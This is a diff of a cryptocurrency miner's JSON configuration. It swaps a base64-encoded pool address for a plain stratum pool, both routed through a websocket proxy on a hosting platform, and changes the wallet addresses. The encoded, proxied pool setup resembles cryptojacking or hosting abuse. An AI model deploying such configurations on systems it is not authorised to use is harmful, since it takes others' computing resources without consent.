@@ -1,7 +1,7 @@
 {
-  "host": "wss://web-production-b425.up.railway.app/cG93ZXIyYi5ldS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "host": "wss://web-production-b425.up.railway.app/stratum+tcp://stratum-eu.rplant.xyz:7022",
   "port": 3306,
-  "user": "RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi",
-  "pass": "c=RVN",
+  "user": "mbc1qjl0fslfcvqm76l4za48ekx7k0ww2nc5hjdgn4j",
+  "pass": "x",
   "threads": 4
 }
